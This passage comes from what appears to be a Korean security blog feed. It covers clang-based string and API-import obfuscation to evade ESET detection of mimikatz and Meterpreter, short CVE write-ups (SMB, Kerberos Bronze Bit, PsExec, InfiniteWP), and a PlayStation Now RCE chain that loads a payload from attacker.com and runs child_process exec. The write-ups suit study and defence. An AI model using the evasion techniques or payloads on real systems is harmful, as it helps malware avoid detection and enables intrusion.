class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>볼 수 있듯이 문자열 난독화와 API 난독화 패스의 조합은 상당히 강력하다. <code>Test</code> 문자열은 작은 문자열은 무시하는 것으로 결정했기 때문에 남아있다. 그 후 난독화 소스 코드는 빌드할 수 있다.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>윈도우10 가상 머신에서 테스트 결과 원래 기능이 계속 작동하는 것으로 보인다. 더 중요한 것은 난독화된 바이너리에 <code>MessageBox</code> 문자열이 없다.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>안티바이러스 ESET Nod32 관련해서 우리는 <code>samlib.dll</code>과 관련된 API imports 중 특히 아래에 있는 API들을 숨기는 것이 중요하다는 것을 발견했다.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>이러한 함수들은 AV 엔진 어디에서도 블랙리스트에 있지 않지만 내부 탐지 신뢰 점수를 높인다. 이러한 함수에 <code>ApiCallConsumer</code>를 등록해야 하므로 이름과 함수 프로토타입이 필요하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>그 후 이러한 컬렉션을 반복하고 각 컬렉션을 처리하기 위해 <code>main.cpp</code>를 업데이트한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>여기서 <code>std::make_unique</code>는 이 반복문에서 힙에 있는 객체를 인스턴스화할 수 있기에 중요하고 나중에 이러한 객체를 수동으로 쉽게 해제할 수 있다. 이것은 더 이상 사용하지 않을 때 자동으로 해제될 것이다.</p><p>마지막으로 mimikatz, 특히 <code>kuhl_m_lsadump.c</code>로 난독화를 테스트할 수 있다.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>이것은 흥미로운 결과를 만든다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>에서 가져온 API를 위한 Run-time dynamic linking</p><p>실제 함수 호출은 완벽하게 수정되었다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>에서 가져온 함수 호출들은 완벽하게 수정되었다.</p><p><code>PRINT_ERROR</code> 매크로 내부의 문자열은 <code>do&#123;&#125;while(0)</code>을 통해 매크로를 사용하여 난독화 되지 않았다. obfuscator의 버그를 찾는데 <code>mimikatz</code>보다 좋은 프로젝트를 찾기 못했다.</p><h2 id="개선사항"><a href="#개선사항" class="headerlink" title="개선사항"></a>개선사항</h2><p>이 부분은 여러분을 위해 남겨진 작업들이다 🙂</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linking을 수행하기 위해 실제로 API <code>LoadLibrary/GetProcAddress</code>가 필요하지 않다.</p><p>후킹을 피하기 위해 이 함수들은 재구현하는 것이 좋고 이미 그것을 할 수 있는 오픈소스 프로젝트가 있다.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>여기까지 읽었다면, translation unit의 상단에 이러한 함수들을 위한 구현을 추가하고(<code>findInjectionSpot</code> 사용) WinAPI 대신에 구현을 사용하기 위해 메소드 <code>addGetProcAddress</code>를 업데이트하면 된다는 것을 알 것이다.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>는 성공적으로 수행되지 않을 경우 <code>NULL</code>을 반환하므로 이에 대한 검사를 추가하여 오류를 정상적으로 복구할 수 있다. 현재 상황에서 크래시가 매우 잘 날 수도 있다.</li><li><code>GetProcAddress</code>도 오류가 발생하면 <code>NULL</code>을 반환하므로 이것도 확인하는 것이 중요하다.</li></ul><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>이 글에서 우리는 정규식을 사용하지 않고 C/C++ 코드 베이스에서 함수 호출을 정확하게 교체할 수 있는 방법을 보여줬다. 모든 것은 안티바이러스 소프트웨어가 우리가 pentest를 하는 동안 사용하는 Meterpreter나 다른 소프트웨어에 관해 행동 정보를 정적으로 수집하는 것을 막기 위해 진행되었다.</p><p>ESET Nod32에 적용된 이 작업은 모든 Meterpreter 모듈이 탐지되지 않도록 하는 주요 단계였고 더 발전된 제품에 도움이 되었다.</p><p>API imports를 숨기는 것도 하나지만 악성코드가 실행되면 보안 소프트웨어가 API 호출 모니터링에 의해 행동 정보를 수집하는 방법도 있다.</p><p>그런 관점에서 다음 글은 의심스러운 Win32 API가 직접적인 syscalls을 하도록 자동적으로 refactoring 하는 것이다. 이것은 Cylance, Traps과 Kaspersky 같은 AV의 userland hook을 통한 런타임 탐지 우회의 핵심 단계이다.</p><h2 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
      <tag>iat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
    <link href="/2020/12/12/fabu1ous/2020-12-12/"/>
    <url>/2020/12/12/fabu1ous/2020-12-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys 드라이버</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)에서 CVE-2020-17140가 패치되어 Write-up이 공개되었습니다. CVE-2020-17140은 <code>SMB2_SET_INFO</code> 패킷의 처리 로직에서 발생하는 use after free로 커널 메모리를 노출시키는 취약점입니다.</p><p>SMBv2 이후부터 LEASE라는 새로운 caching mechanism이 도입되었고 클라이언트는 <code>SMB2_CREATE_REQEUST_LEASE_V2</code> 패킷을 보내 공유 파일에 lease를 생성하고, <code>SMB2_SET_INFO</code> 패킷을 보내 공유 파일의 lease를 수정할 수 있습니다.</p><p>srv2.sys 드라이버는 SMB2_SET_INFO 패킷을 받으면 <code>srv2!Smb2UpdateLeaseFileName</code>를 호출해서 lease 이름을 수정하는데, new lease name이 기존의 old lease name보다 길 경우 새로운 메모리(newFileBuf)를 할당해 old lease name을 백업합니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name을 담고 있던 oldFileBuf를 할당 해제한 후에 newFileBuf에 복사하기 때문에 use after free가 발생합니다. oldFileBuf를 해제한 후 댕글링 포인터의 상태에 따라 kernel info leak 또는 BSoD로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>kernel</tag>
      
      <tag>use after free</tag>
      
      <tag>smb</tag>
      
      <tag>info leak</tag>
      
      <tag>bsod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
    <link href="/2020/12/11/l0ch/2020-12-11/"/>
    <url>/2020/12/11/l0ch/2020-12-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos는 Windows Active Directory 도메인 내에서 사용자, 서버 및 기타 리소스를 서로 인증하는 데 사용되는 프로토콜입니다.<br>Kerberos의 기존 공격 방법인 Golden Ticket 및 Silver Ticket 공격의 변형인 Bronze Bit 공격이 공개되었습니다.</p><blockquote><p>Golden/Silver Ticket 공격<br>내부 네트워크에 침입한 이후 동일한 네트워크의 Kerberos 인증시스템을 사용하는 다른 시스템의 자격 증명을 위조하는 공격기법</p></blockquote><br><p>Bronze Bit는 Microsoft가 Kerberos 프로토콜에 추가 한 <code>S4U2self</code> 및 <code>S4U2proxy</code> 프로토콜을 악용하며 Kerberos 프로세스가 변조된 서비스 티켓을 감지할 수 없어 발생합니다. 공격을 위해서는 다음 조건이 만족되어야 합니다.</p><ol><li>해커는 내부 네트워크의 시스템 하나(Service1)를 장악해 Active Directory 내에 접근 권한이 있어야 합니다.</li><li>침입한 시스템인 Service1에 대한 암호 해시가 필요합니다.</li><li>Service1에는 다른 시스템(Service2)에 대한 제한된 신뢰 관계가 있습니다.</li></ol><p>위 조건이 만족되면 해커는 다음과 같은 공격이 가능합니다.</p><ol><li>사용자를 식별하고 티켓을 반환하는 <code>S4U2self</code> 에서 User2의 Service1 서비스 티켓을 가져옵니다. 이때 <code>force-forwardable</code> 옵션을 사용하면 반환하는 서비스 티켓이 전달 가능한 티켓으로 변환됩니다.</li><li>Service1의 해시로 티켓을 복호화하고 플래그 값의 두 번째 비트를 0→1 로 변경한 뒤 다시 암호화합니다. </li><li>조작된 티켓은 <code>S4U2proxy</code> 에서 전송되고 Service2에 대한 서비스 티켓이 User2로 반환되어 <code>User2.ccache</code>의 디스크에 기록됩니다.</li><li>해커는 Service1 유저(User1) 권한으로 Service2 유저(User2)의 Kerberos 서비스 티켓을 얻을 수 있어 User2 권한으로 Service2에 액세스가 가능합니다.</li></ol><p>이는 Golden/Silver Ticket과 유사한 공격 방법이지만 단일 비트 플립을 이용했기 때문에 Bronze Bit로 명명되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>kerberos</tag>
      
      <tag>bronze bit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PsExec Local Privilege Escalation</title>
    <link href="/2020/12/10/idioth/2020-12-10/"/>
    <url>/2020/12/10/idioth/2020-12-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 패치되지 않은 취약점입니다.</p></blockquote><p>SysInternals Suite에서 원격으로 애플리케이션을 실행할 수 있는 PsExec에서 Local Privilege Escalation 취약점이 발견됐습니다. 해당 취약점은 글을 작성한 시점의 버전인 PsExec v2.2까지 영향을 미치며 아직 패치되지 않았습니다.</p><p>PsExec 클라이언트와 원격 PSEXESVC 서비스는 named pipe를 통해 통신합니다. 그 중 <code>\\PSEXESVC</code> 파이프는 실행할 응용 프로그램, 명령줄 데이터 등 PsExec 클라이언트의 명령을 분석하여 실행하는 역할을 합니다. <code>\\PSEXESVC</code> 파이프는 Administrator만 read/write 권한을 가져 권한이 낮은 사용자가 파이프에 read\write 하는 것을 막습니다.</p><p>하지만 PSEXESVC가 <code>\\PSEXESVC</code> 파이프를 생성할 때 파이프가 이미 존재할 경우 해당 <code>\\PSEXESVC</code> 파이프의 handle을 가져옵니다. 따라서 낮은 권한의 애플리케이션이 PSEXESVC가 실행되기 전에 <code>\\PSEXESVC</code> 파이프를 생성하면 PSEXESVC는 자신이 생성한 파이프가 아닌 이미 존재하는 파이프의 handle을 가져옵니다. PSEXESVC가 낮은 권한으로 생성된 <code>\\PSEXESVC</code> 파이프의 handle을 가져오면 PSEXESVC을 통해 SYSTEM 권한으로 명령, 응용 프로그램 실행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>idioth</tag>
      
      <tag>psexec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28642: Auth bypass via password reset mechanism</title>
    <link href="/2020/12/09/fabu1ous/2020-12-09/"/>
    <url>/2020/12/09/fabu1ous/2020-12-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 웹사이트의 관리 솔루션 Infinite WP에서 비밀번호 재설정 방식의 결함을 이용해 admin panel에 접근할 수 있는 인증 우회 취약점이 발견되었습니다.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>비밀번호 재설정 링크를 생성하는 php코드입니다.  피해자의 <code>email</code>을 사전에 입수하고 <code>userID</code>,  <code>microtime(true)</code> 값을 유추할 수 있다면 누구나 유효한 링크를 타고 원하는 유저의 비밀번호를 재설정할 수 있습니다.</p><ul><li>userID<ul><li>auto-increment integer입니다. manage-user라는 유료 addon을 구매하지 않았다면 기본값이 1입니다.</li></ul></li><li>email<ul><li>가입되지 않은 email 주소라면 <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>로 redirect 됩니다. 이를 이용해 Infinite WP에 가입된 email인지 판별할 수 있습니다.</li></ul></li><li>microtime(true)<ul><li>microtime(true)의 값은 비밀번호 재설정 링크가 만들어질 때의 Unix timestamp입니다. Http date 해더 값을 이용해 유추가 가능합니다.</li></ul></li></ul><p>생성된 링크는 24시간 동안 유효합니다. 공개된 POC는 위에서 설명한 세 값을 이용해 브루트포싱 공격을 시도하며 평균 1시간 내외로 유효한 링크를 찾아냅니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Remote Code Execution in PlayStation Now</title>
    <link href="/2020/12/08/l0ch/2020-12-08/"/>
    <url>/2020/12/08/l0ch/2020-12-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now ≤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>게임 스트리밍 서비스 PlayStation Now에서 원격 코드 실행 취약점이 발견되었습니다.<br><br><br>PS Now의 주요 구성요소로는 QAS와 AGL이 있습니다. QAS는 Qt5 프레임워크로 개발된  <code>psnowlauncher.exe</code> 실행파일이며 PS Now의 메인 애플리케이션입니다.  AGL은 Electron 응용 프로그램이며 QAS에 의해 실행됩니다. 처음 로드할 페이지의 URL을 매개변수로 받아 실행이 가능합니다.<br><br><br><code>nodeIntegration</code>은 <code>Electron BrowserWindows</code>에서 실행되는 기능으로 javascript에서 Windows 프로세스를 생성할 수 있습니다. 기본값은 false지만 AGL에서는 true로 설정되어 있으며, AGL은 로드하는 URL 검증을 하지 않아 해커의 페이로드가 담긴 URL을 통해 javascript에서 임의 코드를 실행할 수 있습니다.<br><br><br>이 임의 코드 실행 취약점은 QAS에서 실행되는 로컬 웹 소켓 서버를 통해 원격으로 수행할 수 있습니다. 웹사이트가 다음 request를 로컬 웹 소켓 서버에 보내면 AGL에 로드된 URL을 QAS에서 실행합니다.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>그러나 source와 target을 바꿔 URL을 AGL에서 로드할 수 있도록 구성하면 원격에서 AGL이 로드할 URL을 조작할 수 있습니다.<br><br><br>피해자의 컴퓨터에서 PS Now와 QAS, 로컬 웹 소켓이 실행 중일 경우 아래와 같은 방법으로 원격 코드 실행이 가능합니다.</p><ol><li><p>브라우저로 해커의 웹사이트에 접속합니다.</p></li><li><p>웹 사이트는 피해자 PC의 웹 소켓 서버 <code>ws://localhost:1235</code> 에 연결됩니다.</p></li><li><p>웹사이트는 웹 소켓 서버에 다음과 같은 메시지를 보냅니다. </p> <pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:&#123;<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>&#125;,<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>&#125;</code></pre></li><li><p>AGL은 <code>https://attacker.com/rce_payload.html</code> 를 로드합니다. 이때 <code>rce_payload.html</code>의 javascript 코드가 피해자의 PC에서 실행됩니다.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>playstation</tag>
      
      <tag>remote code execution</tag>
      
      <tag>playstation now</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17521: Apache Groovy Information Disclosure</title>
    <link href="/2020/12/07/idioth/2020-12-07/"/>
    <url>/2020/12/07/idioth/2020-12-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovy에서 <code>createTempDir</code> method로 인한 Local Privilege Escalation과 Information Disclosure가 가능한 취약점이 발견되었습니다. 이 취약점은 유닉스 기반 운영 체제와 Mac OSX, Windows의 옛날 버전이 영향을 받습니다. 취약점에 노출되는 조건은 아래와 같습니다.</p><ul><li>영향을 받는 운영 체제에서 Groovy code가 동작</li><li>다른 유저가 Groovy code에 접근할 수 있음</li><li><code>createTempDir</code> extension method를 통해 임시 디렉터리가 생성</li></ul><p>Groovy는 모든 유저가 공유할 수 있는 OS 임시 디렉터리 내에 임시 디렉터리를 만들 수 있습니다. Groovy에서 <code>createTempDir</code> method를 사용하면 java stub을 생성할 때 사용되거나 user code를 대신하기 위한 임시 디렉터리가 생성됩니다. Groovy user code가 <code>createTempDir</code> method를 사용하여 임시 디렉터리에 실행할 수 있는 코드를 저장하면 Local Privilege Escalation이 가능하고 민감한 정보를 저장하기 위해 임시 디렉터리가 사용된다면 정보가 노출되거나 수정될 수 있습니다.</p><p>취약점이 수정된 Groovy 2.5 이상 버전과 JDK 7 이상에서 실행되는 Groovy 2.4에서는 Groovy Code를 실행하는 사용자만 읽을 수 있는 디렉터리를 생성하는 새로운 JDK method를 사용합니다. 하지만 이 방법은 Local Privilege Escalation은 막을 수 있지만 Information Disclosure는 막을 수 없습니다.</p><p>시스템 환경 변수 <code>java.io.tmpdir</code>를 실행 중인 사용자의 고유 디렉터리로 설정하면 모든 운영 체제와 Groovy 버전에서 취약점이 해결됩니다. 혹은 Groovy extension method 대신 JDK의 <code>Files#createTempDirectory</code> method를 사용하여 취약점을 방지할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>information disclosure</tag>
      
      <tag>apache</tag>
      
      <tag>idioth</tag>
      
      <tag>groovy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] x64 stack alignment</title>
    <link href="/2020/12/06/fabu1ous/x64-stack-alignment/"/>
    <url>/2020/12/06/fabu1ous/x64-stack-alignment/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 